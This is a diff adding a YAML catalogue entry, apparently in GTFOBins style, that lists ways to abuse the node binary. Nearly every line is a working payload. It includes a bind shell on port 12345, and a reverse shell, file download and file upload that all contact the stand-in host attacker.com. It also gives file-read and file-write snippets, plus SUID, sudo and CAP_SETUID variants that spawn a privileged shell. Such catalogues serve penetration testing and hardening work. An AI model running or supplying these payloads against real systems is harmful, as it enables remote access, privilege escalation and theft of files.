@@ -1,0 +1,88 @@
+---
+functions:
+  bind-shell:
+  - code: |-
+      node -e 'sh = require("child_process").spawn("/bin/sh");
+      require("net").createServer(function (client) {
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+      }).listen(12345)'
+    connector: tcp-client
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
+          require("net").createServer(function (client) {
+            client.pipe(sh.stdin);
+            sh.stdout.pipe(client);
+            sh.stderr.pipe(client);
+          }).listen(12345)'
+      unprivileged:
+  download:
+  - code: |-
+      node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    sender: http-server
+  file-read:
+  - code: |-
+      node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - code: |-
+      node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      node -e 'sh = require("child_process").spawn("/bin/sh");
+      require("net").connect(12345, "attacker.com", function () {
+        this.pipe(sh.stdin);
+        sh.stdout.pipe(this);
+        sh.stderr.pipe(this);
+      })'
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
+          require("net").connect(12345, "attacker.com", function () {
+            this.pipe(sh.stdin);
+            sh.stdout.pipe(this);
+            sh.stderr.pipe(this);
+          })'
+      unprivileged:
+    listener: tcp-server
+    tty: false
+  shell:
+  - code: |-
+      node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+    contexts:
+      capabilities:
+        code: |-
+          node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+        list:
+        - CAP_SETUID
+      sudo:
+      suid:
+        code: |-
+          node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
+      unprivileged:
+  upload:
+  - code: |-
+      node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver: http-server
+...
